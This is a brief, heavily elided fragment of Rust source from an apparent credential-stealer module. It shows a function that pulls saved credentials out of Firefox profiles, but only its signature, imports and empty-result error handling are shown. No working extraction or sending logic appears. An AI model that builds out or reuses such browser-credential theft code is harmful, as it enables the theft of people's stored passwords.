...
use crate::stealer::common::{base64_decode, file_exists, get_appdata_roaming};
...
fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
    ...
    if credentials.is_empty() {
        Err(StealerError::DatabaseError(
            "No Firefox credentials found".into(),
        ))
    } else {
        Ok(credentials)
    }
